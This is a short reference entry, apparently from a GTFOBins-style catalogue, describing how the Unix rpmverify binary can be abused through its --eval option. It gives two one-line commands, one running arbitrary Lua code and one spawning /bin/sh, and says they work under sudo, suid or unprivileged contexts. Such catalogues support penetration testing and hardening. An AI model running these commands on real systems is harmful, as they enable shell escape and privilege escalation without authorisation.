---
type: gtfobin
name: rpmverify
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# rpmverify

## inherit

```bash
rpmverify --eval '%{lua:...}'
```
_This allows to run Lua code (`...`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
rpmverify --eval '%(/bin/sh 1>&2)'
```
**Contexts:** sudo, suid, unprivileged
